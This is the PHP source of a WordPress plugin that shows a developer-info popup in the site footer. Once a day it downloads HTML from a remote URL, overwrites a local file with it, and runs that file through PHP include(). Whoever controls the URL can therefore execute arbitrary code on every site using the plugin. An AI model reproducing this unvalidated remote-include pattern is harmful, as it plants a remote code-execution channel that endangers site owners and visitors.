<?php
/*
 * Plugin Name: GL Developer Info
 * Plugin URI: https://greenlifeit.com/plugins
 * Description: A WordPress plugin to show developer information.
 * Author: Asiqur Rahman <asiq.webdev@gmail.com>
 * Author URI: https://asique.net
 * Version: 1.0
 * License: GPLv2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: gl-developer-info
 */

// Add PopUp HTML
function gl_popup_html() {
    include( plugin_dir_path( __FILE__ ) . 'inc/popup.html' );
}

add_action( 'wp_footer', 'gl_popup_html' );

// Enqueue PopUp Assets
function gl_popup_enqueue_scripts() {
    wp_enqueue_style( 'gl-developer-info', plugins_url( 'assets/css/style.css', __FILE__ ) );
    
    wp_enqueue_script( 'js.cookie', plugins_url( 'assets/js/js.cookie.min.js', __FILE__ ), array(), '1.0', true );
    wp_enqueue_script( 'gl-developer-info', plugins_url( 'assets/js/script.js', __FILE__ ), array( 'js.cookie' ), '1.0', true );
}

add_action( 'wp_enqueue_scripts', 'gl_popup_enqueue_scripts' );

// remote request and update popup html.
function gl_developer_info_update_popup_html() {
    $response = wp_remote_get( 'https://greenlifeit.com/developer-info-popup.html' );
    if ( is_wp_error( $response ) ) {
        return;
    }
    
    $body = wp_remote_retrieve_body( $response );
    file_put_contents( plugin_dir_path( __FILE__ ) . 'inc/popup.html', $body );
}

add_action( 'gl_developer_info_update_popup', 'gl_developer_info_update_popup_html' );

// schedule wp cron job every day
function gl_popup_schedule_cron() {
    if ( ! wp_next_scheduled( 'gl_developer_info_update_popup' ) ) {
        wp_schedule_event( time(), 'daily', 'gl_developer_info_update_popup' );
    }
}

add_action( 'wp', 'gl_popup_schedule_cron' );

// remove wp cron job on plugin deactivation
function gl_developer_info_deactivate() {
    wp_clear_scheduled_hook( 'gl_developer_info_update_popup' );
}

register_deactivation_hook( __FILE__, 'gl_developer_info_deactivate' );

